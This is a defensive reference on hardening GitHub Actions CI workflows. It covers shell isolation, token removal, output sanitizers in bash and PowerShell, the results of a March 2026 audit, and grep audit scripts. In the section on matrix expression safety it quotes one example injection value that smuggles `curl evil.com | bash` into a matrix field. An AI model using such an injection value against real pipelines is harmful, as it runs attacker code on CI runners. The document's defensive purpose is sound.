# CI Workflow Governance Hardening — Reference

> **Purpose**: Document the security hardening applied to GitHub Actions workflows
> per [xsscx/governance](https://github.com/xsscx/governance) standards, and
> serve as a reference for auditing future workflow changes.
>
> **Origin**: WASM CI workflow remediation (March 2026), branch `ci-workflow-updates`
> in InternationalColorConsortium/iccDEV.

## Background

GitHub Actions workflows are attack surface. Untrusted inputs flow through:
- `${{ github.event.pull_request.title }}` — PR titles (user-controlled)
- `${{ matrix.* }}` — matrix values (may come from workflow_call inputs)
- `${{ github.ref }}` — branch names (user-controlled for PRs)
- GITHUB_STEP_SUMMARY — rendered as HTML in the Actions UI

Without hardening, these inputs enable:
- **Shell injection** via `${{ }}` expressions in `run:` blocks
- **HTML injection** via unsanitized writes to GITHUB_STEP_SUMMARY
- **Credential leakage** via Git credential helpers and GITHUB_TOKEN in child processes
- **Environment poisoning** via BASH_ENV pointing to attacker-controlled files

## The Four Pillars

### 1. Shell Isolation

```yaml
shell: bash --noprofile --norc {0}
env:
  BASH_ENV: /dev/null
```

`--noprofile --norc` prevents loading `~/.bashrc`, `~/.profile`, `/etc/profile`
which could contain malicious aliases or functions. `BASH_ENV=/dev/null` blocks
the startup-file injection vector.

### 2. Credential Reduction

```bash
git config --global credential.helper ""
unset GITHUB_TOKEN || true
```

Resets the Git credential helper (prevents token caching in child processes)
and removes GITHUB_TOKEN from environment. The `|| true` handles runners
that don't set the variable.

### 3. Strict Error Handling

```bash
set -euo pipefail
```

- `-e` — exit on any error
- `-u` — treat unset variables as errors
- `-o pipefail` — pipe fails if any command in pipe fails

### 4. Output Sanitization

**Every** write to GITHUB_STEP_SUMMARY, artifact names, or user-visible output
MUST pass through `sanitize_line()` or `escape_html()`.

```bash
# Source sanitizer (with inline fallback)
SANITIZER="$GITHUB_WORKSPACE/.github/scripts/sanitize-sed.sh"
if [[ -f "$SANITIZER" ]]; then
  source "$SANITIZER"
else
  escape_html() {
    local s="$1"
    s="${s//&/&amp;}" ; s="${s//</&lt;}" ; s="${s//>/&gt;}"
    s="${s//\"/&quot;}" ; s="${s//\'/&#39;}"
    printf '%s' "$s"
  }
  sanitize_line() { escape_html "$1"; }
fi
```

## sanitize-sed.sh Functions

| Function | Input | Output | Use For |
|----------|-------|--------|---------|
| `escape_html "$s"` | Raw string | HTML-entity-encoded string | All HTML contexts |
| `sanitize_line "$s"` | Raw string | HTML-escaped, control chars stripped | GITHUB_STEP_SUMMARY cells |
| `sanitize_print "$s"` | Raw string | sanitize_line + newline | Convenience |
| `sanitize_ref "$ref"` | Git ref | Safe ref name | Branch/tag in summaries |
| `sanitize_filename "$name"` | File path | Safe filename | Artifact names |

## Multiline Output Pattern

**Problem**: `sanitize_line("$MULTILINE_VAR")` collapses all lines into one.
`sanitize_line()` uses `printf '%s'` (no trailing newline), so a multiline
argument becomes a single blob.

**Solution**: Iterate line-by-line:

```bash
# Per-line sanitization for file listings
find . -name '*.wasm' -exec ls -lh {} \; | while IFS= read -r line; do
  sanitize_line "$line"
  echo ""
done

# Per-line sanitization from a variable
while IFS= read -r line; do
  sanitize_line "$line"
  echo ""
done <<< "$MULTILINE_VAR"
```

## Matrix Expression Safety

`${{ matrix.* }}` expressions in `run:` blocks are string-interpolated BEFORE
bash executes. A crafted value like `"; curl evil.com | bash; #` becomes
executable shell code.

**Fix**: Pass through `env:` block:

```yaml
env:
  MATRIX_BUILD_TYPE: ${{ matrix.build_type }}
run: |
  cmake -DCMAKE_BUILD_TYPE="${MATRIX_BUILD_TYPE}" ..
```

The `env:` block safely stores the value as an environment variable —
bash sees it as a string, not executable code.

## GitHub Actions Expression Parser Quirks

### Empty `${{ }}` is a parse error

Even inside bash comments in `run:` blocks:
```yaml
# WRONG — "An expression was expected" parse error
run: |
  # Never use ${{ }} directly
```

GitHub Actions evaluates ALL `${{ ... }}` patterns in YAML string values,
including those inside bash `#` comments. YAML-level comments (`# at top level`)
are stripped before expression evaluation and are safe.

### `defaults.run.env` does not exist

GitHub Actions supports `defaults.run.shell` and `defaults.run.working-directory`
but NOT `defaults.run.env`. The `BASH_ENV` lockdown must be set per-step or at
job/workflow level `env:`.

## WASM Workflow Audit Results (March 2026)

### Files Hardened

| File | Status |
|------|--------|
| `.github/workflows/wasm-latest-matrix.yml` | Full rewrite + governance |
| `.github/workflows/ci-wasm-build-test.yml` | Retrofit + governance |

### Findings Fixed

| # | Finding | Severity | Category |
|---|---------|----------|----------|
| 1 | 6 steps missing `BASH_ENV: /dev/null` | CRITICAL | Env poisoning |
| 2 | `${{ matrix.build_type }}` in `run:` block | CRITICAL | Shell injection |
| 3 | `${{ }}` (empty) in bash comment text | CRITICAL | Parse error |
| 4 | 6 steps missing credential cleanup | HIGH | Token leakage |
| 5 | 4 steps missing `set -euo pipefail` | HIGH | Error handling |
| 6 | 8 GITHUB_STEP_SUMMARY writes unsanitized | HIGH | HTML injection |
| 7 | `sanitize_line "$MULTILINE"` → 1 line | MEDIUM | Display bug |

### CI Verification

All 6 jobs (3 build configs × 2 workflows) passed after hardening:
- `wasm-latest-matrix.yml` — Release, Debug, Asan configs
- `ci-wasm-build-test.yml` — Release, Debug, Asan configs

## Quick Audit Script

```bash
# Check for missing BASH_ENV lockdown
grep -rn 'run: |' .github/workflows/*.yml | while read match; do
  file=$(echo "$match" | cut -d: -f1)
  line=$(echo "$match" | cut -d: -f2)
  # Check if BASH_ENV: /dev/null appears within 5 lines before
  if ! sed -n "$((line-5)),$((line))p" "$file" | grep -q 'BASH_ENV'; then
    echo "MISSING BASH_ENV: $file:$line"
  fi
done

# Check for direct matrix interpolation in run blocks
grep -rn '\${{ matrix\.' .github/workflows/*.yml | grep 'run:' && echo "CRITICAL: Direct matrix interpolation found"

# Check for unsanitized summary writes
grep -rn 'GITHUB_STEP_SUMMARY' .github/workflows/*.yml | grep -v 'sanitize_line\|sanitize_print\|escape_html' && echo "WARNING: Unsanitized summary writes"
```

## See Also

- [xsscx/governance/actions](https://github.com/xsscx/governance/tree/main/actions) — Upstream standards
- `.github/scripts/sanitize-sed.sh` — V3 bash sanitizer (279 lines, 5 functions)
- `.github/scripts/sanitize.ps1` — V1 PowerShell sanitizer (~310 lines, 8 functions)
- `.github/prompts/workflow-governance.prompt.md` — AI-assisted audit workflow
- `.github/instructions/workflow-governance.instructions.md` — Auto-loaded for workflow files
- `ci-pr-action.yml` — Reference compliant workflow (bash steps)
- `ci-pr-win.yml` — Reference compliant workflow (PowerShell steps)
- `ci-latest-release.yml` — Cross-platform release (bash + PowerShell steps)

## PowerShell Governance Hardening

Windows CI steps follow the same four-pillar model using PowerShell (pwsh).
Two reference implementations exist in iccDEV:
- **`ci-pr-win.yml`** — Full Windows build with PowerShell sanitizer dot-sourced
- **`ci-latest-release.yml`** — Cross-platform release with PowerShell summary steps

### PowerShell Sanitizer API (sanitize.ps1)

The PowerShell sanitizer at `.github/scripts/sanitize.ps1` mirrors the bash
`sanitize-sed.sh` API:

| PowerShell Function | Bash Equivalent | Purpose |
|--------------------|-----------------|---------| 
| `Escape-Html $str` | `escape_html "$str"` | HTML entity encode `& < > " '` |
| `Strip-CtrlKeepNewlines $str` | (internal) | Remove control chars, keep LF |
| `Strip-CtrlRemoveNewlines $str` | (internal) | Remove all control chars + LF→space |
| `Trim-Whitespace $str` | (internal) | Trim leading/trailing whitespace |
| `Truncate-String $str -MaxLen N` | (internal) | Truncate with `...` ellipsis |
| `Sanitize-Line $str` | `sanitize_line "$str"` | Single-line: strip ctrl + escape + truncate |
| `Sanitize-Print $str` | `sanitize_print "$str"` | Multi-line: strip ctrl (keep LF) + escape + truncate |
| `Sanitize-Ref $ref` | `sanitize_ref "$ref"` | Safe ref name `[A-Za-z0-9._/-]` only |
| `Sanitize-Filename $name` | `sanitize_filename "$name"` | Safe filename (no `/`) |
| `Safe-EchoForSummary $str` | N/A | Sanitize + Write-Output |
| `Sanitizer-Version` | N/A | Returns `"iccDEV-sanitizer-v1"` |

**Configuration** (environment variables):
- `$env:SANITIZE_LINE_MAXLEN` — Max single-line length (default: 1000)
- `$env:SANITIZE_PRINT_MAXLEN` — Max multi-line length (default: 8000)

### Mandatory PowerShell Step Template

```yaml
- name: Build (Windows)
  shell: pwsh -NoProfile -NoLogo -NonInteractive -Command {0}
  env:
    POWERSHELL_TELEMETRY_OPTOUT: 1
    POWERSHELL_UPDATECHECK: Off
    GH_REPOSITORY: ${{ github.repository }}
    GH_COMMIT_SHA: ${{ github.sha }}
  run: |
    $ErrorActionPreference = 'Stop'
    $PSDefaultParameterValues['*:ErrorAction'] = 'Stop'
    git config --global credential.helper ""
    if (Test-Path env:GITHUB_TOKEN) { Remove-Item env:GITHUB_TOKEN }
    if (Test-Path env:GH_TOKEN) { Remove-Item env:GH_TOKEN }
    if (Test-Path env:ACTIONS_RUNTIME_TOKEN) { Remove-Item env:ACTIONS_RUNTIME_TOKEN }

    # Load sanitizer
    . .github/scripts/sanitize.ps1

    # ... actual work ...

    # Write sanitized summary
    "### Build Results" | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append
    "- Repository: $(Sanitize-Line $env:GH_REPOSITORY)" | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append
    "- Commit SHA: $(Sanitize-Line $env:GH_COMMIT_SHA)" | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append
```

### PowerShell-Specific Patterns

**Input Validation (Allowlist)**:
```powershell
$ValidTypes = @('Debug', 'Release', 'RelWithDebInfo', 'MinSizeRel')
if ($env:BUILD_TYPE -notin $ValidTypes) {
    Write-Error "Invalid build type: $env:BUILD_TYPE"
    exit 1
}
```

**Path Traversal Prevention**:
```powershell
$ResolvedPath = [System.IO.Path]::GetFullPath($InstallPath)
$WorkspacePath = [System.IO.Path]::GetFullPath($env:GITHUB_WORKSPACE)
if (-not $ResolvedPath.StartsWith($WorkspacePath)) {
    Write-Error "Path traversal detected: $ResolvedPath"
    exit 1
}
```

**File Listing (1 item per line)**:
```powershell
. .github/scripts/sanitize.ps1
"### Artifacts" | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append
Get-ChildItem -Recurse -Filter "*.wasm" | ForEach-Object {
    "- ``$(Sanitize-Line $_.Name)`` ($($_.Length) bytes)" |
      Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append
}
```

### Bash vs PowerShell Comparison

| Security Control | Bash | PowerShell |
|-----------------|------|------------|
| Shell flags | `bash --noprofile --norc {0}` | `pwsh -NoProfile -NoLogo -NonInteractive -Command {0}` |
| Env lockdown | `BASH_ENV: /dev/null` | `POWERSHELL_TELEMETRY_OPTOUT: 1` + `POWERSHELL_UPDATECHECK: Off` |
| Error handling | `set -euo pipefail` | `$ErrorActionPreference = 'Stop'` |
| Token removal | `unset GITHUB_TOKEN \|\| true` | `if (Test-Path env:GITHUB_TOKEN) { Remove-Item env:GITHUB_TOKEN }` |
| Sanitizer load | `source .github/scripts/sanitize-sed.sh` | `. .github/scripts/sanitize.ps1` |
| Inline fallback | Minimal `escape_html()` function | N/A (dot-source required) |
| Summary append | `>> "$GITHUB_STEP_SUMMARY"` | `\| Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Append` |

### Audit Checklist — PowerShell Steps

When auditing Windows workflow steps, check:

- [ ] `shell: pwsh -NoProfile -NoLogo -NonInteractive -Command {0}` (not `powershell`)
- [ ] `POWERSHELL_TELEMETRY_OPTOUT: 1` in `env:`
- [ ] `$ErrorActionPreference = 'Stop'` first line in `run:`
- [ ] `git config --global credential.helper ""` before any git operation
- [ ] Token env vars removed (`GITHUB_TOKEN`, `GH_TOKEN`, `ACTIONS_RUNTIME_TOKEN`)
- [ ] `. .github/scripts/sanitize.ps1` loaded before any summary write
- [ ] All `${{ }}` expressions in `env:` block, not in `run:` block
- [ ] All STEP_SUMMARY writes use `Sanitize-Line` or `Sanitize-Print`
- [ ] File listings use per-item `ForEach-Object` with `Sanitize-Line`
